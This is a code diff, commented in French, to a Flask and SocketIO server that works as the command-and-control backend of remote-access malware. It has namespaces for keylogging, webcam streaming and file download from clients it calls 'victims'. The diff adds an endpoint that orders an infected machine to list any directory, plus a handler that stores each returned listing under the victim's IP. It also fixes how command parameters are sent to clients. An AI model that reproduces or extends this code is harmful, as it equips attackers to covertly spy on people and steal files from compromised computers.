@@ -51,6 +51,7 @@ keylogger_ns = api.namespace('api/v1/keylogger', description='Keylogger operatio
 webcam_ns = api.namespace('api/v1/webcam', description='Webcam operations')
 papier_ns = api.namespace('api/v1/papier', description='Papier operations')
 download_file_ns = api.namespace('api/v1/download', description='Download file operations')
+directory_ns = api.namespace('api/v1/directory', description='Directory operations')
 
 auth_model = api.model('Auth', {'secret_key': fields.String(required=True, description='Clé secrète')})
 command_model = api.model('Command', {
@@ -97,6 +98,9 @@ download_file_model = api.model('DownloadFile', {
     'id': fields.Integer(required=True, description='ID du fichier'),
     'file_path': fields.String(required=True, description='Chemin du fichier'),
     'date_created': fields.String(required=True, description='Date de création du fichier')
+})
+directory_model = api.model('Directory', {
+    'dir_path': fields.String(required=True, description='Chemin du répertoire à lister')
 })
 
 client_params = api.parser()
@@ -180,7 +184,7 @@ class HandleCommand(Resource):
 
         client = Client.query.get(client_id)
         if client and client.status == 'online':
-            socketio.emit('command', {'command': command, 'params': duration}, room=client.sid)
+            socketio.emit('command', {'command': command, 'params': params}, room=client.sid)
             app.logger.info(f"Commande *{command}* envoyée au client {client_id} / {client.ip}.")
             return {'status': 'success',
                     'message': f'Commande *{command}* envoyée au **client {client_id} / {client.ip}**.'}, 200
@@ -372,28 +376,39 @@ class StreamWebcam(Resource):
         return Response(stream_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')
 
 
-@download_file_ns.route('/client/<int:client_id>')
-class GetPCVictimFilesByClientId(Resource):
+@directory_ns.route('/client/<int:client_id>')
+class ListDirectory(Resource):
     @jwt_required()
     @api.doc(security='bearer_auth')
-    @download_file_ns.marshal_with(download_file_model, as_list=True)
-    def get(self, client_id):
-        pc_victims = Command.query.filter_by(client_id=client_id, type=CommandType.PC_VICTIM).all()
-        for pc_victim in pc_victims:
-            pc_victim.date_created = pc_victim.date_created.strftime('%d/%m/%Y à %H:%M:%S')
-        return pc_victims, 200
+    @directory_ns.expect(directory_model)
+    def post(self, client_id):
+        data = request.json
+        dir_path = data.get('dir_path')
+        if not dir_path:
+            return {'status': 'error', 'message': 'Chemin du répertoire non spécifié.'}, 400
+
+        client = Client.query.get(client_id)
+        if client and client.status == 'online':
+            socketio.emit('list_directory', {'dir_path': dir_path}, room=client.sid)
+            app.logger.info(f"Commande *list_directory* envoyée au client {client_id} / {client.ip}.")
+            return {'status': 'success',
+                    'message': f'Commande *list_directory* envoyée au client {client_id} / {client.ip}.'}, 200
+        elif client and client.status == 'offline':
+            return {'status': 'error', 'message': 'Client hors ligne.'}, 400
+        else:
+            return {'status': 'error', 'message': 'Client non trouvé.'}, 404
 
 
-@download_file_ns.route('/file/<int:file_id>')
-class GetPCVictimFile(Resource):
+@download_file_ns.route('/client/<int:client_id>/file/<int:file_id>')
+class DownloadFile(Resource):
     @jwt_required()
     @api.doc(security='bearer_auth')
-    def get(self, file_id):
+    def get(self, client_id, file_id):
         file = Command.query.get(file_id)
         if file and os.path.exists(file.file_path):
             return send_file(file.file_path)
         else:
-            return {'status': 'error', 'message': 'Fichier de la victime non trouvé.'}, 404
+            return {'status': 'error', 'message': 'Fichier non trouvé.'}, 404
 
 
 @socketio.on('connect')
@@ -554,6 +569,25 @@ def handle_file(data):
         db.session.add(new_command)
         db.session.commit()
         app.logger.info(f"Fichier reçu de {client_ip} et enregistré sous {file_path}")
+
+
+@socketio.on('directory_listing_response')
+def handle_directory_listing(data):
+    directory_listing = data.get('directory_listing')
+    sid = request.sid
+    client = Client.query.filter_by(sid=sid).first()
+    if client:
+        client_ip = client.ip
+        dir_list_dir = f"directories/{client_ip}"
+        os.makedirs(dir_list_dir, exist_ok=True)
+        file_name = f"directory_listing_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.json"
+        dir_list_path = f"{dir_list_dir}/{file_name}"
+        with open(dir_list_path, 'w', encoding='utf-8') as f:
+            json.dump(directory_listing, f, ensure_ascii=False, indent=4)
+        new_command = Command(type=CommandType.DIRECTORY_LISTING, client_id=client.id, file_path=dir_list_path)
+        db.session.add(new_command)
+        db.session.commit()
+        app.logger.info(f"Liste des fichiers reçue de {client_ip} et enregistrée sous {dir_list_path}")
 
 
 @socketio.on('disconnect')
